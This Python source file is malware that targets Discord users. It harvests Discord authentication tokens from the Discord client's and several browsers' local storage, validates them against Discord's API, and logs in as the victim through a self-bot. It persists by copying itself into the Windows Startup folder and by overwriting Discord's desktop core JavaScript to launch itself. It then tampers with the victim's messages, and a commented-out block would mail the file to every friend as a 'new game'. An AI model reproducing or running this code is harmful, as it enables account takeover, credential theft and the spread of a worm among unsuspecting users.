import time
import discord
from discord.ext import commands
import asyncio
import os
import random
import re
import requests
import shutil

base = os.path.basename(__file__)
local = os.getenv('LOCALAPPDATA')
user = os.getenv('USERNAME')
roaming = os.getenv('APPDATA')
tokens = []

def check_token(token):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "authorization": token
    }
    json = {
        "theme": ""
    }
    r2 = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
    print("code: " + str(r2.status_code))
    if str(r2.status_code) == "401":
        return False
    else:
        return True 


def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

path1 = roaming + '\\discord\\Local Storage\\leveldb'
path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
path4 = local + '\\Google\\Chrome\\User Data\\Default',
path5 = roaming + '\\Opera Software\\Opera Stable',
path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

if os.path.isdir(str(path1)):
    find_tokens(str(path1))
if os.path.isdir(str(path2)):
    find_tokens(str(path2))
if os.path.isdir(str(path3)):
    find_tokens(str(path3))
if os.path.isdir(str(path4)):
    find_tokens(str(path4))
if os.path.isdir(str(path5)):
    find_tokens(str(path5))
if os.path.isdir(str(path6)):
    find_tokens(str(path6))
if os.path.isdir(str(path7)):
    find_tokens(str(path7))

def even_more_persistance():
    jspath = roaming + "\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
    payload = """module.exports = require('./core.asar');
    const { exec } = require("child_process");
    exec(""""'C:\\Users\\" + user + "\\AppData\\Roaming\\" + base + "'"""", (error, stdout, stderr) => {
    if (error) {
            console.log(`error: ${error.message}`);
            return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
    });
"""
    with open(jspath, "w") as inject:
        inject.write(payload)
        inject.close()

prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)

@bot.event
async def on_ready():
    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\" + base)
    even_more_persistance()
    #for friend in bot.user.friends:
        #await friend.send("Ayo try this new game!")
        #await friend.send(file=discord.File(__file__))

@bot.event
async def on_message(message):
    if bot.user.id == message.author.id:
        randombrains = random.randint(1,30)
        firstcontent = message.content
        firstcontentlength = len(firstcontent)
        if message.content == "Ayo try this new game!":
            pass
        contentbefore = ""
        if firstcontentlength < 3:
            pass
        elif firstcontentlength < 5:
            contentbefore = firstcontent[:2]
        elif firstcontentlength > 5:
            firstcontentnum = random.randint(1, 5)
            contentbefore = firstcontent[:firstcontentnum]
        
        await message.edit(content=contentbefore + "BR" + 'A' * randombrains + "INS")
    else:
        pass

for token in tokens:
    if check_token(token):
        bot.run(token, bot=False)
    else:
        pass
